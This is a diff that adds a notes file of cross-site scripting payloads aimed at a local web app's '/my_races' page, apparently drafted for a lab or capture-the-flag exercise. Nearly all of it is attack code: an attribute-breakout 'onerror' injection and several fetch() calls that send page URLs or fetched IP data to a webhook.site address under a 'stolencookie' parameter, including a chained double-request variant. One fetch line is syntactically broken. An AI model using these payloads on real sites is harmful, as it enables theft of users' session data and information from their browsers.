@@ -1,0 +1,39 @@
+http://localhost:5000/my_races
+
+
+
+1"/onerror=alert(1)
+
+1"/onerror=fetch("https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie="+window.location.href).then(response=>response.text()).then(data=>console.log(data)).catch(error=>console.error('Error:',error));
+
+
+fetch("https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie=" + window.location.href)
+    .then(response => response.text())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
+
+
+fetch(https://httpbin.org/ip);
+
+
+
+
+fetch('https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie='+OUTPUT_HERE).then(response=>response.text()).then(data=>console.log(data)).catch(error=>console.error('Error:',error));
+
+
+
+double request:
+        fetch("https://httpbin.org/ip")
+    .then(response => response.text())
+    .then(data => {
+        fetch("https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie=" + encodeURIComponent(data))
+            .then(innerResponse => innerResponse.text())
+            .then(innerData => console.log(innerData))
+            .catch(innerError => console.error('Inner Error:', innerError));
+    })
+    .catch(error => console.error('Error:', error));
+
+
+
+
+
